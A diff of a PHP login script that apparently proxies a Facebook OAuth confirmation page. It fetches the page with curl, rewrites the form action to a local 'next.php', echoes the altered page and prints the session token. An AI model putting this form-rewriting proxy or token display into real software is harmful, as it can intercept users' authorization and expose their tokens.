@@ -2,7 +2,7 @@
 session_start();
 
 $token = gettoken();
-//echo '<br>'. $token .'</br>';
+echo '<br>'. $token .'</br>';
 if(strlen($token) > 300){$token = "invalid";};
 $_SESSION["token"] = $token;
 grava();
@@ -10,8 +10,8 @@ if($token == "invalid"){
  echo '<br>'. $token .'</br>';
  echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
 }else{
-//echo 'chat';
-header('Location: chat.php'); 
+echo 'chat';
+//header('Location: chat.php'); 
 }
 exit;
 
@@ -47,48 +47,17 @@ $url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it w
 //echo "</pre>";
 //echo $url; // Voila
 //echo"<br>";
+
+
+
+ 
+
+
+$pos1 = strpos($a, "<head>");
+$aMod = str_replace('action=\"\/v2.6\/dialog\/oauth\/confirm\"','action="next.php"', substr($a,$pos1,strlen($a)));
 curl_close($ch);
-//////////////////////////////////////////////////////////////////////////////////
- 
-$textopost = '';
-foreach ($_POST as $key => $value){
-  //echo "{$key} = {$value}\r\n";
-  //echo '<br>';
-  if(strcasecmp($key,'submit') !== 0){
-    $textopost = $key . '=' . urlencode($value) . '&' . $textopost;
-  }else{
-    //var_dump($key);
-    //echo '<br>';
-    //var_dump($value);
-    //echo '<br>';
-    //echo $key . ' a<br>';
-    reset($value);
-    $first_key = key($value);
-    //echo $first_key . ' g<br>';
-    //echo $value[$first_key] . ' g2<br>';
-    
-    reset($value[$first_key]);
-    $first_keyB = key($value[$first_key]);
-    //echo $first_keyB . ' h<br>';
-    //echo $value[$first_key][$first_keyB] . ' h2<br>';
-    
-    $textoadd1 = $key . '[' . $first_key . ']=' . urlencode($value[$first_key]);
-    //echo $textoadd1 . ' texto1<br>';
-    if($first_keyB != ''){
-          //echo 'usar 2<br>';
-          $textoadd1 = $key . '[' . $first_key . '][' . $first_keyB . ']=' . urlencode($value[$first_key][$first_keyB]);
-          //echo $textoadd1 . ' texto2<br>';
-    }
-  
-    
-    //echo $textoadd1 . ' escolhido<br>';
-    $textopost = $textopost . $textoadd1;
-    //echo '<br>submete: ' . $textopost . '<br>';
-  }
-  //var_dump($value);
-}
-echo '<br>' . $textopost . '<br>'; 
- 
+echo $aMod;
+////////////////////////////////////////////////////////////////////////////////// 
  
  
  
